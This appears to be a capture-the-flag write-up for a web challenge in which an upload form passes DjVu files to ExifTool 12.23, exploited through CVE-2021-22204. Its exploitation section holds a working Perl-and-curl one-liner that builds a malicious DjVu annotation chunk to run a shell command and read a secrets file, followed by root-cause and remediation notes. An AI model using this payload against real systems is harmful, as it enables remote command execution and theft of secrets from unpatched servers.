---
title: "CherryPic — Cybercom"
description: "The home page exposed a CherryPic image-metadata feature:"
event: "noct"
category: "web"
categoryLabel: "Web"
tags: ["NOCT CTF 2026","web"]
date: "2026-09-26"
teammate: false
source: "NOCT/web/4/writeup.md"
---

## Flag

```text
NOCT{ch3rry_supply_ch41n_0wn3d}
```

## Enumeration

The home page exposed a CherryPic image-metadata feature:

```text
GET /cherrrypic
POST /cherrrypic/upload
```

The upload form accepts `.djvu` files. A harmless upload revealed that the server runs **ExifTool 12.23** against uploaded files.

ExifTool 12.23 is vulnerable to CVE-2021-22204, a Perl code-injection vulnerability in DjVu annotation metadata.

## Exploitation

The payload uses an `ANTa` annotation chunk containing Perl code. The following command builds a minimal DjVu file in memory and submits it directly to the upload endpoint:

```bash
perl -e '$p=q{(metadata "\\c${system(q(cat /run/secrets/flag))};")}; \
  $i=pack("nnCCnCC",1,1,24,0,300,0,0); \
  $body="DJVUINFO".pack("N",10).$i."ANTa".pack("N",length($p)).$p; \
  print "AT&TFORM",pack("N",length($body)),$body' \
| curl -sS -F 'photo=@-;filename=exploit.djvu' \
  http://f5fb5e75e7d34f3099a9aac49d2597b0.chall.cybercomctf.com/cherrrypic/upload
```

The injected `system()` call executes as the web process. Reading `/run/secrets/flag` places the flag in ExifTool's output:

```text
NOCT{ch3rry_supply_ch41n_0wn3d}
```

## Root cause

The application accepts attacker-controlled DjVu files and passes them to an outdated ExifTool version. ExifTool 12.23 evaluates malicious DjVu annotation content as Perl code, resulting in unauthenticated remote command execution.

## Remediation

- Upgrade ExifTool to a patched version (12.24 or later).
- Reject DjVu files unless they are explicitly required.
- Validate uploaded files by content, not only filename or MIME type.
- Process uploads in a restricted sandbox with no access to secrets.
- Run the metadata parser as a non-privileged user.
